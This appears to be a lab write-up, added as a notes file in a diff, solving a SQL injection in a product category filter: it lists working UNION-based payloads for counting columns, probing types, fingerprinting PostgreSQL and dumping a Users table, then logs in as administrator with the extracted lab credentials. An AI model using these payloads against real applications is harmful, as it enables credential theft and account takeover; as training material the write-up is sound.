@@ -1,0 +1,61 @@
+SQL injection - product category filter
+
+Goals:
+1- retrieve all usernames and passwords
+2- log in as the administrator user
+
+
+Analysis:
+--------
+
+Step #1: Determine the number of columns
+' ORDER BY 1--  --> not displayed on the page
+' ORDER BY 2--  --> displayed on the page
+' ORDER BY 3--  --> error
+The number of columns is 2
+
+Step #2: Determine the data type of the columns
+' UNION SELECT 'a', NULL--
+-> error -> column is not a string data type
+
+' UNION SELECT NULL, 'a'--
+-> no error (200 response) -> column is a string data type
+
+Step #3 (way #1): Display all the usernames and passwords
+' UNION SELECT NULL, username FROM Users--
+' UNION SELECT NULL, password FROM Users--
+
+Usernames:
+carlos
+administrator
+wiener
+
+Passwords:
+e9atja0mebxf06eggkdo
+s2wq6mc80sgonkftmlfz
+kj2koazwabjs509fbe5s
+
+Step #3 (way #2): Find the version of the SQL database and Display all the usernames and passwords
+' UNION SELECT NULL, @@version--  --> checking if the version is Microsoft
+-> error -> The version is not Microsoft
+
+' UNION SELECT NULL, version()--  --> checking if the version is PostgreSQL 	
+-> no error (200 response) -> PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+The version of the SQL database is PostgreSQL
+
+' UNION SELECT NULL, username || password FROM Users--
+
+' UNION SELECT NULL, username || ':' || password FROM Users--
+
+Usernames and passwords:
+wiener:kj2koazwabjs509fbe5s
+carlos:s2wq6mc80sgonkftmlfz
+administrator:e9atja0mebxf06eggkdo
+
+Step #4: Log in as the administrator user
+Log in with :
+Username: administrator
+Password: e9atja0mebxf06eggkdo
+
+Solved.
